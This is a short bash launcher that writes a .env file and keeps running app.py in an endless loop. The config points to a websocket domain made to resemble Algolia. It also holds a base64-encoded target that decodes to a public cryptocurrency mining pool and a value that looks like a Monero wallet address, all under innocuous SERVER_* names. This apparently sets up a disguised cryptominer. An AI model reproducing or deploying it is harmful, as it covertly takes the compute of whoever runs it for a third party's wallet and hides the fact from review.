#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://algolia.dpdns.org
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 30; done
